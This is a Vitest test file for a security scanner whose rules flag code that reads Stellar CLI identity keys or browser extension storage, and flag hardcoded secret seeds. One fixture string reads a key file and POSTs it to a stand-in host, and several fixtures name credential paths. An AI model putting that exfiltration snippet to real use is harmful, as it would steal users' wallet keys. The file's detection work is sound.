import { describe, expect, it } from 'vitest';
import { runRule } from '../__fixtures__/run-rule.js';
import { randomBytes } from 'node:crypto';
import { encodeSeed } from '../strkey.js';
import stl001 from './stl-001.js';
import stl002 from './stl-002.js';
import stl003 from './stl-003.js';

describe('DOME-STL-001', () => {
  const identity = ['.config', 'stellar', 'identity'].join('/');

  it('reviews code that reads CLI identities, blocks when it also uses the network', async () => {
    expect(await runRule(stl001, { 'scripts/x.js': `fs.readdirSync(os.homedir() + '/${identity}')` })).toEqual(['review:reads@scripts/x.js:1']);
    const exfil = `const k = fs.readFileSync(home + '/${identity}/a.toml');\nfetch('https://example.invalid', { method: 'POST', body: k });`;
    expect(await runRule(stl001, { 'scripts/x.js': exfil })).toEqual(['block:exfiltrates@scripts/x.js:1']);
  });

  it('ignores documentation', async () => {
    expect(await runRule(stl001, { 'README.md': identity })).toEqual([]);
  });
});

describe('DOME-STL-002', () => {
  it('reviews code that reads browser extension storage', async () => {
    const path = ['Local Extension', 'Settings'].join(' ');
    expect(await runRule(stl002, { 'lib/a.py': `open(home + '/${path}/x')` })).toEqual(['review:reads@lib/a.py:1']);
  });
});

describe('DOME-STL-003', () => {
  it('reports a valid secret seed generated at test time', async () => {
    const seed = encodeSeed(randomBytes(32));
    expect(await runRule(stl003, { 'config/keys.ts': `export const KEY = '${seed}';` })).toEqual(['review:secretKey@config/keys.ts:1']);
  });

  it('ignores 56-character strings with a bad checksum', async () => {
    const seed = encodeSeed(randomBytes(32));
    const broken = seed.slice(0, 50) + (seed[50] === 'A' ? 'B' : 'A') + seed.slice(51);
    expect(await runRule(stl003, { 'a.ts': broken })).toEqual([]);
  });
});

describe('DOME-STL-001 forms', () => {
  it.each([
    "path.join(os.homedir(), '.config', 'stellar', 'identity')",
    'readdirSync(`${home}/.config/soroban/identity`)',
    "open(home + '\\\\.config\\\\stellar\\\\identity')",
  ])('finds %s', async (code) => {
    expect(await runRule(stl001, { 'lib/x.js': code })).toHaveLength(1);
  });

  it('ignores prose that mentions the folder', async () => {
    expect(await runRule(stl001, { 'lib/x.js': "const doc = 'Keys live in ~/.config/stellar/identity unless secure';" })).toEqual([]);
  });
});
